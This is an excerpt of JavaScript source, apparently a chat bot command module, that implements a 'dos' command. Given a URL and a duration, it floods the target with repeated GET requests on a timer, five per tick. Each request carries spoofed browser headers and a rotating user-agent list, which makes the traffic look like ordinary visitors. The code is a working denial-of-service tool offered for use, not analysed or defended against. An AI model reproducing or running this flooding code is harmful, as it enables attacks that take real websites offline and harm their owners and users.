...
async function message(sock, m, store) {
    ...
    if(arg.split(" ") < 2) return nyarios(`Masukan: ${Prefix}${cmd} [time (ms)] [url]`);
    try{
        const [time, url] = arg.split(" ");
        nyarios(JSON.stringify(await dos(url,time),null,2));
    }catch(e){
...
function dos(target,time){
    if (!target) return "masukan Target";
    if (!time) return "masukan Waktu";
    ...
    return new Promise(function(res,rej){
        ...
        const interval = setInterval(function(){
            for (let a = 0; a < 5; a++) {
                const [useragentnya,idx] = useragent(i);
                i = idx+1;
                const headers = {
                    'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'su,en-US;q=0.9,en;q=0.8',
                    'content-length': "0",
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': `${target.split("://")[0]}://${target.split("://")[1].split("/")[0]}`,
                    'priority': 'u=1, i',
                    'referer': target,
                    ...
                    'user-agent': useragentnya,
                    'x-prototype-version': '1.6.0',
                    'x-requested-with': 'XMLHttpRequest'
                }

                sock.sendRequest(m).get(target,{headers})
                .then(({ status }) => {
...
function useragent(a) {
    const list = `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36
